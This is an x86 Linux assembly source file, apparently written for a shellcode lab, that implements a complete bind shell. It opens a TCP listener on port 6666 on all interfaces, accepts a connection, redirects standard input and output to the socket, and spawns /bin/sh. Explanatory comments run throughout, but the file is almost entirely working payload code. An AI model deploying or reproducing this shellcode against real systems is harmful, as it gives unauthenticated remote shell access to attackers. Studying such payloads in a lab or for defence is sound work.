BITS 32
global _start

; basic bindshell for shellcode lab
; by dash

_start:
; all syscalls /usr/include/i386-linux-gnu/asm/unistd_32.h
; in difference we have to specify everything via socketcall
; int socketcall(int call, unsigned long *args);
; 66h / 102 is socketcall
; /usr/include/linux/net.h

; we need a socket, PF_INET, SOCK_STREAM, IPPROTO
; its *not* sys/socket
; go to /usr/include/bits/socket.h for domain
; go to /usr/include/bits/socket_type.h for type
; go to /usr/include/netinet/in.h for protocol

; define socket
xor		eax, eax		; clean accumulator
xor		ebx, ebx
xor		edx, edx	; prepare edx for null
mov		al, 0x66
mov		bl, 0x1		; SYS_SOCKET (/usr/include/linux/net.h) 
push	edx			; IPPROTO == 0
push	0x1			; SOCK_STREAM == 1
push	0x2			; AF_INET / PF_INET == 2
mov		ecx,esp
int		0x80

; define bind
; EAX has socket fd
; /usr/include/linux/in.h
; #define __SOCK_SIZE__   16      /* sizeof(struct sockaddr)  */
; typedef unsigned short int sa_family_t;
; struct sockaddr {
; sa_family_t sa_family;		unsigned short int 2 byte
; char        sa_data[14]; }

; we do not want to specify a special ip address
; we simply define 0.0.0.0 with nulled register
xchg	edi, eax
push 	edx				; 0.0.0.0
push	word 0x0A1A		; PORT 6666
push	word 0x2		; AF_INET, sin_family
mov		ecx, esp		; struct sockaddr *addr
mov		esi, ecx		; save struct sockaddr for later use in ESI
push	0x10			; socklen_t addrlen
push	ecx				; sockaddr *addr
push	edi				; socket fd
mov		ecx, esp
mov		bl,0x2			; SYS_BIND
xor		eax, eax		; clean accumulator
mov		al,0x66			; SYS_SOCKETCALL
int		0x80

; define listen
; do socketcall
; SYS_LISTEN 4
; int listen(int sockfd, int backlog);
; 
xor		eax, eax
mov		al,0x66		; SYS_SOCKETCALL
mov		bl,0x4		; SYS_LISTEN, 1st Argument to SYS_SOCKETCALL
push	0x1			; backlog
push	edi			; sockfd
mov		ecx, esp	; 2nd argument to SYS_SOCKETCALL
int		0x80

; define accept
; SYS_ACCEPT 5
; int accept(int sockfd, struct sockaddr *addr,socklen_t *addrlen);
; addr + addrlen for client, but we dont care about that

xor		eax, eax		; clean accumulator
mov		al,0x66
mov		bl,0x5
push	edx				; flags, null
push	edx
push	edi
mov		ecx, esp
int		0x80

; define dup2
; dup2 duplicate the FDs to the shell 
; new sockfd is in EAX
; int dup2(int oldfd, int newfd);

xor		ecx, ecx
mov		cl,0x2
xchg	ebx,eax
loop:
xor		eax, eax		; clean accumulator
mov		al,0x3F
int		0x80
dec		ecx
jns		loop		; if ecx is *not* -1 (SIGN Flag)

; define execve
; spawning a shell
; int execve(const char *filename, char *const argv[], char *const envp[]);
; 

xor		eax, eax		; clean accumulator
xor		esi, esi
push 	esi
mov		edx, esp		; 3rd argument
push	esi				; NULL 
push	0x68732f6e		; n/sh
push	0x69622f2f		; //bi
mov		ebx, esp		; 1st argument
mov		ecx, edx		; 2nd argument
mov		al,0xb
int		0x80
